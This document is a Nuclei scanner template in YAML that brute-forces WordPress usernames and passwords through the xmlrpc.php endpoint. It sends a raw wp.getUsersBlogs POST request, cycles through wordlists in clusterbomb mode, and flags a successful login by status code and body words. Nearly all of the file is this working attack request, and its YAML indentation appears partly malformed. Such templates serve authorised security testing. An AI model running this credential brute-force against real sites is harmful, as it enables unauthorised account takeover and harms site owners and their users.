id: wordpress-xmlrpc-brute-force

info: 
  name: Wordpress XMLRPC.php username and password Bruteforcer
  author: Exid
  severity: low
  description: Ths template bruteforces username and passwords through xmlrpc.php being available.
  reference: https://bugdasht.ir/reports/3c6841c0-ae4c-11eb-a510-517171a9198c
  tag: wordpress,php,xmlrpc,config

requests:
  - raw:
  - |
     POST /xmlrpc.php HTTP/1.1
     Host: {{Host}}
     Content-Length: 235
     
     <?xml version="1.0" encoding="UTF-8"?>
      <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
          <param>
            <value>{{username}}</value>
          </param>
            <param>
          <value>{{password}}</value>
            </param>
        </params>
      </methodCall>
 
    payloads:
      username: usernames.txt
      password: passwords.txt
    attack: clusterbomb

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - 'url'
          - 'xmlrpc'
        part: body